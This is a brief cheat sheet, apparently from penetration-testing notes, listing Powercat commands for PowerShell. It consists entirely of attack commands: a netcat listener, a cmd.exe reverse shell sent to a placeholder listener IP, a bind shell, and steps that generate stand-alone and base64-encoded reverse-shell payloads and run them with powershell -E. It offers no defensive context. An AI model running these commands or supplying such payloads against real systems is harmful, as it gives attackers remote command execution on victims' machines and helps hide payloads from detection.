# Powercat 

```powershell
# Load powercat and view help
C:\> ..\powercat.ps1
C:\> powercat -h
```

```powershell
# Powercat reverse shell
$ sudo nc -lvp 443

# Send a reverse shell via Powercat 
C:\> powercat -c <listener IP address> -p 443 -e cmd.exe
```

```powershell
# Powercat bind shells
C:\> powercat -l -p 443 -e cmd.exe

# Use netcat to connect to the bind shell
$ nc -nv <listener IP address> 443
```

```powershell
# Powercat Stand-alone payload
C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -g > reverseshell.ps1

# Generate stand-alone encoded payload
C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1

C:\> powershell -E <content from encoded_reverseshell.ps1>
